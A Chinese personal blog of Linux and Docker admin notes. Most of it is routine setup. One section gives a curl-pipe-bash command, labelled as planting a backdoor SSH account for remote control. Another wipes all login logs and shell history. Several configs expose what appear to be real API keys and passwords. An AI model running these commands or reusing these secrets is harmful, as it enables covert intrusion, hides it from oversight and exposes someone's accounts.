---

title: Linux 运维笔记(持续更新)
date: 2022-03-20 16:37:48
updated: 2022-03-20 16:37:48
categories: Linux
tags: [Linux]
description:
thumbnail: https://api.whaleluo.top/onedrive/file/?path=/picstorage/blog/img/Linux-Operation-Note-Banner.png
banner_img: https://api.whaleluo.top/onedrive/file/?path=/picstorage/blog/img/Linux-Operation-Note-Banner.png

---

# Linux Operation Note

​![Banner](https://api.whaleluo.top/onedrive/file/?path=/picstorage/blog/img/Linux-Operation-Note-Banner.png)​

## 硬盘操作

了解两个特殊的设备：

1. /dev/null：回收站、无底洞。  
2. /dev/zero：产生字符。

### 格式化硬盘为 ETX4 格式

```shell
mkfs.ext4 /dev/*** #将硬盘格式化成 ext4 格式
```

### 设置硬盘开机挂载

```shell
# 1.通过 lsblk 命令获取磁盘分区，并挂载磁盘到mnts目录。
lsblk

# 2.通过 blkid 命令获取存储设备UUID
blkid /dev/sda

# 3.编辑 /etc/fstab 文件，在fstab最后添加存储设备信息，实现开机自动加载
vim /etc/fstab
UUID=cdfc0924-7703-40f4-b6ab-8ef3f9adbf06 /mnt/disk ext4 defaults 0 0

# 4.通过mount -a命令重新加载 /etc/fstab 内容
mount -a

# 常用查询硬盘命令
fdisk -l
df -h
```

### 备份与目录迁移

#### 使用 tar.gz

备份打包：

```shell
tar -czvf backup.tar.gz /path/to/directory
```

这将使用 `tar` 命令将指定目录打包成一个压缩文件 `backup.tar.gz`。你可以将 `/path/to/directory` 替换为要备份的目录路径。使用 `-c` 参数表示创建新的备份，`-z` 参数表示使用 gzip 压缩，`-v` 参数表示显示备份过程中的详细信息。

还原备份：

```shell
tar -xzvf backup.tar.gz -C /path/to/destination
```

这将使用 `tar` 命令解压缩备份文件 `backup.tar.gz` 并将文件还原到目标目录 `/path/to/destination`。使用 `-x` 参数表示解压缩，`-z` 参数表示使用 gzip 解压缩，`-v` 参数表示显示还原过程中的详细信息，`-C` 参数指定还原到的目标目录。

### HDParm 硬盘休眠

让你的硬盘冷静下来，不要让服务器呼噜呼噜！

```shell
apt-get install hdparm

# 5 分钟无操作自动休眠
hdparm -S 60 /dev/sda1

# 进入待机
hdparm -y /dev/sda1

# 进入睡眠
hdparm -Y /dev/sda1

# 查看配置
vim /etc/hdparm.conf
```

### 硬盘自动挂载

在 `/etc/fstab` 文件中为硬盘指定了 `nofail` 选项，系统将忽略找不到硬盘的错误，并继续启动过程。

```shell
mkdir /mnt/disk/

# 获取分区 UUID 和 Type
blkid

# 编辑 /etc/fstab
UUID=7673-85E5 /mnt/disk exfat defaults,nofail 0 2

# 执行全部挂载
mount -a
```

如果不幸 `/etc/fstab` 没有正确设置时，Ubuntu 仍然会启动，但是文件系统变为只读 read-only，需要把文件系统重新挂载为读写将 `/etc/fstab` 设置正确后重启保存。

```shell
mount -o remount rw /
```

### 测试硬盘读写

```shell
hdparm -Tt /dev/sda
```

### 查看实时硬盘速率

### SMB 文件共享

```shell
sudo apt update
sudo apt install samba

# 用户添加
sudo smbpasswd -a root
```

> NOTE: Whenever you modify this file you should run the command `testparm` to check that you have not made any basic syntactic errors.

```ini
[mntReadDir]
comment = Ubuntu mnt dir
path = /mnt/
read only = yes
browsable = yes
guest ok = yes
create mask = 0777
directory mask = 0777

[tmp]
comment = Ubuntu Tmp
path = /tmp/
read only = no
browsable = yes
guest ok = yes
create mask = 0777
directory mask = 0777

[mntPrivate]
comment = Ubuntu mnt dir
path = /mnt/
read only = no
browsable = yes
guest ok = no
create mask = 0777
directory mask = 0777
```

## 进程相关

### 开机自启动某个脚本

```shell
# 编辑 systemctl 文件
vim /etc/systemd/system/ttnode.service

# 文件内容
[Unit]
Description=Python Task Service
After=network.target

[Service]
Type=simple
User=root
Group=root
ExecStart=/usr/node/ttnode -p /mnt/disk/
Restart=always
RestartSec=2
PrivateTmp=true

[Install]
WantedBy=multi-user.target

# 重载
systemctl daemon-reload
# 启动
systemctl start ttnode
# 开机自启
systemctl enable ttnode
```

## 网络相关

### ApacheBench AB 接口 QPS/TPS 测试

- **并发数**（concurrent）：并发数只某个时间范围内。同时在使用系统的用户个数。从实际场景来看，并发数就是同时使用该服务器接口的客户端数，这些客户端可能调用不同的 API。严格意义上来说，并发数是指同时请求同一个 API 的用户个数。
- **QPS**：`Queries Per Second` 意思是“每秒查询率”，是接口每秒能够相应的查询次数，是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。
- **TPS**：是 `Transactions Per Second` 的缩写，也就是事务数/秒。它是软件测试结果的测量单位。一个事务是指一个客户机向服务器发送请求然后服务器做出反应的过程。客户机在发送请求时开始计时，收到服务器响应后结束计时，以此来计算使用的时间和完成的事务个数。

**QPS** 基本类似于 **TPS**，但是不同的是，对于一个页面的一次访问，形成一个 Tps；但一次页面请求，可能产生多次对服务器的请求，服务器对这些请求，就可计入 **QPS** 之中。

例如：访问一个页面会请求服务器 3 次，一次放，产生一个“T”，产生 3 个“Q”

```shell
apt-get install apache2-utils
# 打开文件限制
ulimit -SHn 65536
echo "* soft nofile 65536" >>/etc/security/limits.conf
echo "* hard nofile 65536" >>/etc/security/limits.conf

ab -n 10000 -c 1000 "http://usa1.whaleluo.top:9810/"
```

### OpenVPN

> 参考：[窗口 - 使用OpenVPN，我如何只能让局域网通过VPN？- 服务器故障 (serverfault.com)](https://serverfault.com/questions/785767/with-openvpn-how-can-i-only-let-lan-go-through-the-vpn) **重要**
>
> [ROUTE: route addition failed - lsgxeva - 博客园 (cnblogs.com)](https://www.cnblogs.com/lsgxeva/p/11378768.html)
>
> [networking - How to route only subnet in OpenVPN and not internet traffic - Super User](https://superuser.com/questions/1608345/how-to-route-only-subnet-in-openvpn-and-not-internet-traffic)

安装脚本:[Nyr/openvpn-install](https://github.com/Nyr/openvpn-install)

服务端：`server.conf`

```ini
server 192.168.255.0 255.255.255.0
verb 3
key /etc/openvpn/pki/private/0.0.0.0.key
ca /etc/openvpn/pki/ca.crt
cert /etc/openvpn/pki/issued/0.0.0.0.crt
dh /etc/openvpn/pki/dh.pem
tls-auth /etc/openvpn/pki/ta.key
key-direction 0
keepalive 10 60
persist-key
persist-tun

proto tcp
# Rely on Docker to do port mapping, internally always 1194
port 1194
dev tun0
status /tmp/openvpn-status.log

user nobody
group nogroup
comp-lzo no

### Route Configurations Below
route 192.168.254.0 225.225.225.0

### Push Configurations Below
```

客户端：`client.conf`

```ini
client
nobind
dev tun
remote-cert-tls server
remote tx.cyidz.xyz 11194 tcp

<key>
-----BEGIN PRIVATE KEY-----
....
-----END CERTIFICATE-----
</ca>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
....
-----END OpenVPN Static key V1-----
</tls-auth>

# redirect-gateway def1  # 注释掉
dhcp-option DNS 114.114.114.114 # 自定义DNS
route 192.168.1.0 255.255.255.0  # 添加路由
route 192.168.0.0 255.255.255.0
```

### 命令行测速

使用南开大学的命令行测速： [南大测速 NJU Test](https://test.nju.edu.cn/)  
[使用命令行工具测速 | e-Science Document](https://doc.nju.edu.cn/books/07cdf/page/d1f25)

```shell
wget https://github.com/librespeed/speedtest-cli/releases/download/v1.0.10/librespeed-cli_1.0.10_linux_amd64.tar.gz
tar -xzvf // unpack
./librespeed-cli --server-json http://test.nju.edu.cn/cli.json --server 1
```

### 查看实时网卡流量

使用 nload 工具

```shell
apt-get install nload
```

### 测速网站

1. NJU 南大测速 支持命令行：[南大测速 NJU Test](https://test.nju.edu.cn/)
2. 中科大测速：[中国科学技术大学测速网站](https://test.ustc.edu.cn/)
3. 电信宽带测速：[10000.gd.cn/#/speed](https://10000.gd.cn/#/speed)
4. 台大测速（测海外）：[NTU Speed5](http://speed5.ntu.edu.tw/speed5/)

### FRP

2023/12/3： 起猛了，FRP 更新到了 0.52.3 版本，2023/12/3 版本，使用 toml 文件配置。

GitHub：[GitHub - fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet.](https://github.com/fatedier/frp)

完整配置示例：[conf](https://github.com/fatedier/frp/tree/dev/conf)

#### 服务端配置

frps.ini

```ini
# frps server config
bindAddr = "0.0.0.0"
bindPort = 7000
kcpBindPort = 7000
quicBindPort = 7002

# TCP MUX
# transport.tcpMux = true

# tls 
tls.force = true


# If you want to support virtual host, you must set the http port for listening (optional)
# Note: http port and https port can be same with bindPort
vhostHTTPPort = 80
vhostHTTPSPort = 443

# admin
webServer.addr = "0.0.0.0"
webServer.port = 7500
webServer.user = "admin"
webServer.password = "admin"


# log config
log.to = "./frps.log"
# trace, debug, info, warn, error
log.level = "info"
log.maxDays = 3
log.disablePrintColor = false
detailedErrorsToClient = true


# auth
auth.method = "token"
auth.token = "12345678"
allowPorts = [
  { start = 2000, end = 3000 },
  { single = 3001 },
  { single = 3003 },
  { start = 4000, end = 50000 }
]


maxPortsPerClient = 0

subDomainHost = "frps.com"

# custom404Page = "/path/to/404.html"
```

```ini
# frps server config
bindAddr = "0.0.0.0"
bindPort = 43200
kcpBindPort = 43201
quicBindPort = 43202

# TCP MUX
# transport.tcpMux = true

# tls 
tls.force = true


# If you want to support virtual host, you must set the http port for listening (optional)
# Note: http port and https port can be same with bindPort
vhostHTTPPort = 43200
vhostHTTPSPort = 43433

# admin
webServer.addr = "0.0.0.0"
webServer.port = 43100
webServer.user = "admin"
webServer.password = "admin123"


# log config
# log.to = "./frps.log"
# trace, debug, info, warn, error
log.level = "info"
log.maxDays = 3
log.disablePrintColor = false
detailedErrorsToClient = true


# auth
auth.method = "token"
auth.token = "bobo"
# allowPorts =
maxPortsPerClient = 0

```

#### 客户端

frpc.ini

```ini
# frpc client config
user = "WF"
serverAddr = "ifrp.club"
serverPort = 7000
loginFailExit = false

# log config
# log.to = "./frpc.log"
log.level = "info"
log.maxDays = 3
log.disablePrintColor = false

auth.method = "token"
# auth token
auth.token = "123456789"

# Set admin address for control frpc's action by http api such as reload
webServer.addr = "0.0.0.0"
webServer.port = 7400
webServer.user = "admin"
webServer.password = "admin"

# tcp Mux
# transport.tcpMux = true
transport.protocol = "tcp"

# tls
transport.tls.enable = true

# Proxy
# transport.proxyURL = "http://user:passwd@192.168.1.128:8080"
# transport.proxyURL = "socks5://user:passwd@192.168.1.128:1080"
# transport.proxyURL = "ntlm://user:passwd@192.168.1.128:2080"


# dns
dnsServer = "223.5.5.5"


[[proxies]]
name = "ssh"
type = "tcp"
localIP = "127.0.0.1"
localPort = 22
transport.useEncryption = false
transport.useCompression = false
remotePort = 22220

[[proxies]]
name = "file"
type = "tcp"
localIP = "127.0.0.1"
localPort = 5244
transport.useEncryption = false
transport.useCompression = false
remotePort = 22225

# socks5 proxy
[[proxies]]
name = "plugin_socks5"
type = "tcp"
remotePort = 22228
[proxies.plugin]
type = "socks5"
username = "root"
password = "lovehyy9420"

# file
[[proxies]]
name = "plugin_static_file"
type = "tcp"
remotePort = 22230
[proxies.plugin]
type = "static_file"
localPath = "/mnt/disk/downloads"
stripPrefix = "static"
httpUser = ""
httpPassword = ""
```

## Shell 相关

### SSH 链接超时设置

修改 server 端的 `/etc/ssh/sshd_config`

```shell
# server每隔60秒发送一次请求给client，然后client响应，从而保持连接
ClientAliveInterval 60 

# server发出请求后，客户端没有响应得次数达到3，就自动断开连接，正常情况下，client不会不响应
ClientAliveCountMax 3 
```

### SSH 配置密钥登陆

客户端运行

```shell
# WAY1
ssh-copy-id username@remote_host

# WAY2
mkdir -p ~/.ssh
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# WAY3
scp ./file root@192.168.1.1:/path_on_host/
```

编辑 `/etc/ssh/sshd_config` 文件，进行如下设置：

```shell
RSAAuthentication yes
PubkeyAuthentication yes
```

重启 ssh 服务：

```shell
service sshd restart
```

### 清除 ssh 所有登录日志

适用于 Debian 系和 Centos 系等发行版。

```shell
echo > /var/log/wtmp
echo > /var/log/btmp
echo>/var/log/lastlog
echo > /var/log/secure
echo > /var/log/messages
echo> /var/log/syslog
echo> /var/log/xferlog
echo> /var/log/auth.log
echo> /var/log/user.log
cat /dev/null > /var/adm/sylog
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/openwebmail.log
cat /dev/null > /var/log/mail.info
echo>/var/run/utmp
echo > .bash_history
history -cw
```

### ZSH 终端美化

安装

```shell
cd ~
sudo apt-get install git zsh wget -y
sh -c "$(wget -O- https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)"

# 从马云安装
export REMOTE=https://gitee.com/mirrors/oh-my-zsh.git 
sh -c "$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)"

# 原Github安装
sh -c "$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"

# 解决 OpenWRT git 异常
opkg update  
opkg remove git  
opkg install git-http  
opkg install ca-bundle

# 解决收手机字体问题
sudo apt-get install fonts-powerline

# 安装插件
cd ~/.oh-my-zsh/plugins
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git
git clone https://github.com/zsh-users/zsh-autosuggestions.git

# 编辑配置
vim ~/.zshrc
ZSH_THEME="agnoster" or "ys"
plugins=(git zsh-syntax-highlighting zsh-autosuggestions sudo)

# 刷新
source ~/.zshrc

# 设置 ZSH 为默认 shell
cat /etc/shells
chsh -s /bin/zsh

# OpenWRT 设置 ZSH 为默认 shell
which zsh && sed -i -- 's:/bin/ash:'`which zsh`':g' /etc/passwd

# 迁移到其他用户
cd ~
cp .oh-my-zsh /home/wf/.oh-my-zsh -r
cp .zshrc /home/wf/.zshrc
cp .vimrc /home/wf/.vimrc

# 修复权限
sudo chown -R wf /home/wf/.oh-my-zsh
compaudit | xargs chmod g-w,o-w

```

### SSH 设置密钥登陆并添加 hacker account

用于一键下毒远控。

```shell
curl -sSL https://raw.githubusercontent.com/WhaleFell/TGBot/main/exc.sh | sudo /bin/bash
```

## Docker

### 安装

国内加速: [https://get.daocloud.io/](https://get.daocloud.io/)

官方命令安装：

```shell
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
```

### Useful Command

```shell
# 强制停止并删除镜像
docker rm -f 名称
# entry shell and rm
docker run -it --rm --name tgbot /bin/sh

# 复制文件
docker cp ./TGBot.session tgbot:/wkdir/

docker run -it --rm --name tg_forwardMsgBot -v /wfwork/tgbot_base/:/wkdir/ tgbot_base /bin/sh

docker run -d --name tg_forwardMsgBot -v /wfwork/tgbot_base/:/wkdir/ tgbot_base python3 main.py
```

### 开启 IPV6

[【有用的小知识】Docker-qBittorrent 开启IPv6 笔记 | 我不是咕咕鸽](https://blog.laoda.de/archives/docker-qbittorrent-ipv6/index.html)

编辑 `/etc/docker/daemon.json` ，添加以下内容：（如果没有这个文件直接创建）

```json
{  
 "ipv6": true,  
 "fixed-cidr-v6": "2001:db8:abc1::/64",  # IPv6前缀可以自定义，请确保符合规则   
 "experimental": true,  
 "ip6tables": true  
}
```

重启：

```shell
systemctl restart docker
```

### Image 各种镜像

#### Portainer 管理 UI

```shell
docker run -d -p 9000:9000 \
--name portainer \
--restart=always \
-v /var/run/docker.sock:/var/run/docker.sock \
portainer/portainer:latest
```

#### Frps 服务端

```shell
docker run --restart=always --network host -d \
-v /etc/frp/frps.ini:/etc/frp/frps.ini \
--name frps snowdreamtech/frps
```

frps.ini

```ini
[common]
bind_addr = 0.0.0.0
bind_port = 37700
bind_udp_port = 37711

token = lovecyx

dashboard_port = 37710
dashboard_user = admin
dashboard_pwd = lovehyy

max_pool_count = 9999
max_ports_per_client = 0

tls_only = true
allow_ports = 30000-50000
```

#### Frpc 客户端

[docker frpc 中文文档](https://www.itcoder.tech/posts/docker-frp/)

```shell
docker run --network host -d \
-v /root/frpc/frpc.ini:/etc/frp/frpc.ini \
--name frpc \
--restart=always \
snowdreamtech/frpc
```

#### 到服务器的网速测试

1. 使用 html5-speedtest [Docker](https://hub.docker.com/r/ilemonrain/html5-speedtest/)

```shell
sudo docker run --restart=always \
--name openspeedtest \
-d -p 6688:80 ilemonrain/html5-speedtest
```

1. 使用 HomeBox [GitHub - XGHeaven/homebox: A Toolbox for Home Local Networks](https://github.com/XGHeaven/homebox)

```shell
docker run -d -p 3300:3300 --name homebox xgheaven/homebox
```

#### FileBrowser 文件管理

[https://filebrowser.org/installation](https://filebrowser.org/installation)

```sh
docker run \
    -v /mnt/:/srv \
    -v /root/filebrowser.db:/database.db \
    -v /path/.filebrowser.json:/.filebrowser.json \
    -u $(id -u):$(id -g) \
    -p 8080:80 \
    filebrowser/filebrowser
```

#### NFS 文件共享

> **NFS**，是 **Network File System** 的简写，即网络文件系统。网络文件系统是 FreeBSD 支持的文件系统中的一种，也被称为 NFS. NFS 允许一个系统在网络上与他人共享目录和文件。 通过使用 NFS，用户和程序可以像访问本地文件一样访问远端系统上的文件。

docker hub：[https://hub.docker.com/r/erichough/nfs-server/](https://hub.docker.com/r/erichough/nfs-server/)

```shell
docker pull erichough/nfs-server
docker run                                            \
  -v /root/:/file/  \
  -e NFS_EXPORT_0='/file *(rw,no_subtree_check,async)'        \
  -e NFS_SERVER_THREAD_COUNT=4 \
  --privileged                               \
  --network host \
  --name=nfs-server \
  erichough/nfs-server
```

> 在 UNIX 和类 UNIX 系统中，/etc/exports 是一个配置文件，用于指定可以通过 NFS 共享的文件系统和相关参数。该文件定义了服务器上可供客户端挂载的共享目录以及访问权限。以下是/etc/exports 文件的一般格式和作用：
>
> 每一行代表一个共享目录的定义，具有以下基本格式：
>
> ```
> <目录路径> <允许访问的客户端>(选项)
> ```
>
> - ​`<目录路径>`​：指定要共享的目录的路径。可以是绝对路径或相对路径。
> - ​`<允许访问的客户端>`​：指定被允许访问该共享目录的客户端。可以使用 IP 地址、域名或子网掩码来指定。也可以使用通配符进行模式匹配，如 `*`​表示允许所有客户端访问。
> - ​`(选项)`​：可选项，用于指定共享选项。常用的选项包括：
>
>   - ​`rw`​：允许读写访问权限。
>   - ​`ro`​：只允许读取访问权限。
>   - ​`noaccess`​：禁止访问该共享目录。
>   - ​`root_squash`​：将客户端的 root 用户映射为匿名用户（通常是 nfsnobody），以增加安全性。
>   - ​`all_squash`​：将所有用户映射为匿名用户，用于增加安全性。
>   - ​`async`​：异步写入，提高性能但降低可靠性。
>   - ​`sync`​：同步写入，确保数据的可靠性但性能较低。
>   - ​`insecure`​：允许不安全的访问请求，如非特权端口。
>   - ​`no_subtree_check`​：不进行子树检查。
>
> /etc/exports 文件的作用是定义 NFS 共享的配置信息，以便服务器将指定的目录和选项提供给客户端进行挂载和访问。每当修改 /etc/exports 文件后，需要使用 `exportfs`​命令重新加载 NFS 服务器的配置，以使更改生效。

仅通过 NFSv4 连接，则只需使用 TCP 端口 `2049`​

performance-tuning：[https://github.com/ehough/docker-nfs-server/blob/develop/doc/advanced/performance-tuning.md](https://github.com/ehough/docker-nfs-server/blob/develop/doc/advanced/performance-tuning.md)

Set the **`NFS_SERVER_THREAD_COUNT`**​ environment variable to control how many server threads `rpc.nfsd`​ will use. A good minimum is one thread per CPU core, but 4 or 8 threads per core is probably better. The default is one thread per CPU core.

Running the container with `--network host`​ *might* improve network performance by 10% - 20% on a heavily-loaded server [[1](https://jtway.co/docker-network-performance-b95bce32b4b9),[2](https://www.percona.com/blog/2016/08/03/testing-docker-multi-host-network-performance/)], **though this hasn't been tested.**

查看 CPU 内核数：`cat /proc/cpuinfo| grep "cpu cores"| uniq`​

问题：the problem is in the docker-machine. If you want to use nfs mounts you need to run modprobe nfs in the machine itself, not in container. Container uses kernel of the machine. Same with modprobe nfs and nfs server.问题出在码头工人机器上。如果你想使用 nfs 挂载，你需要在机器本身而不是容器中运行 modprobe nfs。容器使用机器的内核。与 modprobe nfs 和 nfs 服务器相同。

在 Windows 上配置 NFS 客户端： [https://cloud.tencent.com/developer/article/1840455](https://cloud.tencent.com/developer/article/1840455)

#### DDNS-GO

基于 Golang 语言开发的 DDNS 程序。[GitHub - jeessy2/ddns-go: 简单好用的DDNS。自动更新域名解析到公网IP(支持阿里云、腾讯云、Dnspod、Cloudflare、Callback、华为云、百度云、Porkbun、GoDaddy、Google Domain)](https://github.com/jeessy2/ddns-go)

```shell
docker run -d --name ddns-go --restart=always --net=host -v /root/configs/ddns-go:/root jeessy/ddns-go
```

#### AdGuardHome DNS

[Docker · AdguardTeam/AdGuardHome Wiki · GitHub](https://github.com/AdguardTeam/AdGuardHome/wiki/Docker)

```shell

```

#### SmartDNS

[SmartDNS](https://pymumu.github.io/smartdns/)

国内用 UDP DNS 国外用 https tls 的 DNS

```shell
server 223.5.5.5 -bootstrap-dns
server 114.114.114.114
server 202.96.128.166:53
server-https https://dns.google/dns-query
server-https https://1.1.1.1/dns-query
```

修改本机 DNS：

```shell
# 编辑 并关闭监听
vim /etc/systemd/resolved.conf
```

#### QBittorent 种子下载

[GitHub - SuperNG6/Docker-qBittorrent-Enhanced-Edition: Docker-qBittorrent-Enhanced-Edition](https://github.com/SuperNG6/Docker-qBittorrent-Enhanced-Edition)

因为涉及大量 UDP 之类的链接，请使用 host 网络。用 `id` 命令确定用户 UID

```shell
docker run  \
    --name=qbittorrentee  \
    -e WEBUIPORT=8600  \
    -e PUID=0 \
    -e PGID=0 \
    -e TZ=Asia/Shanghai \
    -v /root/configs/qb:/config  \
    -v /mnt/disk/downloads:/downloads  \
    --restart always  \
    --network host \
    superng6/qbittorrentee:latest
```

或者不使用 IPV6，在后期设置 IPV6  
需要改成 51782 端口，因为 6881 端口已经被封禁

```shell
docker create  \
    --name=qbittorrent  \
    -e WEBUIPORT=8600  \
    -e PUID=0 \
    -e PGID=0 \
    -e TZ=Asia/Shanghai \
    -p 51782:51782  \
    -p 51782:51782/udp  \
    -p 8600:8600  \
	-v /root/configs/qb:/config  \
    -v /mnt/disk/downloads:/downloads  \
    --restart always  \
	superng6/qbittorrentee:latest
```

#### Alist

[Home | AList文档](https://alist.nn.ci/zh)

```shell
docker run -d \
--restart=always \
-v /root/configs/alist:/opt/alist/data \
-v /mnt/:/mnt/ \
-e PUID=0 \
-e PGID=0 \
-e UMASK=022 \
--name="alist" \
--network=host \
xhofe/alist:latest
```

#### Homarr 导航页

Official Document: [👋 Welcome to Homarr | Homarr Docs](https://homarr.dev/docs/about)

```shell
docker run \
--name homarr \
--restart always \
-p 7575:7575 \
-v /var/run/docker.sock:/var/run/docker.sock \
-v /root/configs/homarr/configs:/app/data/configs \
-v /root/configs/homarr/data:/data \
-v /root/configs/homarr/icons:/app/public/icons \
-d ghcr.io/ajnart/homarr:latest
```

另外，国产的 flare 特别轻量，只不过要编写 yaml 文件。

[GitHub - soulteary/docker-flare: Flare ✨ Lightweight, high performance and fast self-hosted navigation pages, resource utilization rate is <1% CPU, MEM <30 M, Docker Image < 10M](https://github.com/soulteary/docker-flare)

```shell
docker pull soulteary/flare

docker run -d -p 5005:5005 -v /root/configs/flare/:/app soulteary/flare
```

#### Aria2 下载

一个用 C++ 编写的全平台全协议兼容的下载器。

1. 源 aria2 项目：[GitHub - aria2/aria2: aria2 is a lightweight multi-protocol & multi-source, cross platform download utility operated in command-line. It supports HTTP/HTTPS, FTP, SFTP, BitTorrent and Metalink.](https://github.com/aria2/aria2)
2. Docker Aria2 Pro Docker 优化版： [Aria2 Pro - 更好用的 Aria2 Docker 容器镜像 - P3TERX ZONE](https://p3terx.com/archives/docker-aria2-pro.html)

```shell
docker run -d \
--name aria2-pro \
--restart always \
--log-opt max-size=1m \
--network host \
-e PUID=$UID \
-e PGID=$GID \
-e RPC_SECRET=loveAlways \
-e RPC_PORT=6800 \
-e LISTEN_PORT=6888 \
-e DISK_CACHE=128M \
-v /root/config/aria2-config:/config \
-v /mnt/disk/downloads:/downloads \
p3terx/aria2-pro
```

WebGUI AriaNG

```shell
docker run -d \
--name ariang \
--restart always \
--log-opt max-size=1m \
-p 6880:6880 \
p3terx/ariang
```

#### Mariadb 数据库

```console
docker run --name mariadb -d --restart=always \
-e MARIADB_ROOT_PASSWORD=lovehyy \
-e MARIADB_DATABASE=tgforward \
-v /wfwork/data/mariadb:/var/lib/mysql \
-p 3310:3306 \
mariadb:latest
```

## V2ray / Xray Server

一个 代理工具，推荐使用 Xray 内核。

1. [Project X Official Docs](https://xtls.github.io/document/)

### 更新 geoip.dat geosite.dat

[Loyalsoldier/v2ray-rules-dat](https://github.com/Loyalsoldier/v2ray-rules-dat)

```shell
wget https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat
wget https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat
```

## Nginx

docker running

TODO: 这边的 Docker 部署还需要优化

```sh
docker run -d -p 8080:8080 \
--name nginx \
--restart=always \
-v /wfwork/nginx/conf/:/etc/nginx/ \
-v /wfwork/nginx/www:/usr/share/nginx/html \
-v /wfwork/nginx/cert:/usr/local/nginx/cert \
nginx:latest
```

### 调优 Performance Tuning

在 server 字段下添加

```nginx
client_max_body_size 5G;
client_header_timeout 1m;
client_body_timeout 1m;
proxy_connect_timeout 60s;
proxy_read_timeout 1m;
proxy_send_timeout 1m;      
```

### 反向代理

```nginx
user  nginx;
worker_processes  auto;

error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;

    gzip on;

    # include /etc/nginx/conf.d/*.conf;
    server {
        listen 80;
        server_name _;

        # location / {
        #     root   /usr/share/nginx/html;
        #     index  index.html index.htm;
        # }

        location / {
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header Host $http_host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header Range $http_range;
            proxy_set_header If-Range $http_if_range;
            proxy_redirect off;
            proxy_pass http://172.17.0.1:5244/;
            # the max size of file to upload
            client_max_body_size 20000m;
        }
    }

}
```

反向代理 ws. [nginx docs](http://nginx.org/en/docs/http/websocket.html)

```nginx
location /chat/ {
    proxy_pass http://backend;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
}
```

解决 WS 反向代理超时问题, 在 server 字段下添加

```nginx
proxy_connect_timeout 60s;
proxy_read_timeout 60m;
proxy_send_timeout 60m; 
```

自动添加 `/`​ 在 server 字段下添加:

```nginx
server_name_in_redirect off;
```

**完整支持 WS 的反向代理模板：**

```nginx
location /note/ {
     proxy_pass http://192.168.8.1:6806/;
     proxy_set_header X-Real-IP $remote_addr;
     proxy_set_header x-wiz-real-ip $remote_addr;
     proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
     proxy_set_header X-Forwarded-Proto $scheme;
     proxy_set_header X-NginX-Proxy true;

     proxy_http_version 1.1;
     proxy_set_header Upgrade $http_upgrade;
     proxy_set_header Connection "upgrade";
     proxy_set_header Connection "keep-alive";

     proxy_set_header Host $http_host;
     proxy_ssl_session_reuse off;
     proxy_cache_bypass $http_upgrade;
     proxy_redirect off;
 }
```

### 添加证书

#### 使用 acme.sh 申请证书

```shell
# 配置 Docker 为 daemon
docker run -d \
-v /root/acme/:/acme.sh \
-e "CF_Key=e1c57d011aae471eaca549607a2f74154cbe5" \
-e "CF_Email=whalefall9420@outlook.com" \
--restart=always \
--name=acme.sh \
--net=host \
neilpang/acme.sh daemon

# 进入 docker shell
docker exec -it acme.sh sh

# 设置自动更新
docker exec acme.sh --upgrade --auto-upgrade 

# 使用 letsencrypt 签发证书
docker exec acme.sh --set-default-ca --server letsencrypt --issue --dns dns_cf -d *.whaleluo.top

# 导出 nginx 使用的证书
docker exec acme.sh --install-cert -d "*.whaleluo.top" --key-file /acme.sh/private.key --fullchain-file /acme.sh/cert.pem

# 导出 uhttpd 使用的证书
acme.sh --install-cert -d *.whaleluo.top \
--cert-file      /acme.sh/uhttpd.crt  \
--key-file       /acme.sh/uhttpd.key  \

# 容器会自动更新 crantab 每天0点检查证书 `crontab -l`
/acme.sh # acme.sh --cron --home "/root/.acme.sh" --config-home "/acme.sh"
[Wed Jul 19 02:31:31 UTC 2023] ===Starting cron===
[Wed Jul 19 02:31:31 UTC 2023] Already uptodate!
[Wed Jul 19 02:31:31 UTC 2023] Upgrade success!
[Wed Jul 19 02:31:31 UTC 2023] Auto upgraded to: 3.0.6
[Wed Jul 19 02:31:32 UTC 2023] Renew: '*.whaleluo.top'
[Wed Jul 19 02:31:32 UTC 2023] Renew to Le_API=https://acme-v02.api.letsencrypt.org/directory
[Wed Jul 19 02:31:32 UTC 2023] Skip, Next renewal time is: 2023-09-14T17:18:24Z
[Wed Jul 19 02:31:32 UTC 2023] Add '--force' to force to renew.
[Wed Jul 19 02:31:32 UTC 2023] Skipped *.whaleluo.top_ecc
[Wed Jul 19 02:31:32 UTC 2023] ===End cron===

```

#### Nginx 配置

```nginx
user  nginx;
worker_processes  auto;
error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;
events {
    worker_connections  1024;
}
http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;
    sendfile        on;
    keepalive_timeout  65;
    gzip on;

    server {
        listen 80 ssl http2;
        server_name _;

        ssl                      on;
        ssl_certificate     /usr/local/nginx/cert/cert.pem;
        ssl_certificate_key  /usr/local/nginx/cert/private.key;
      
        ssl_session_timeout  5m;
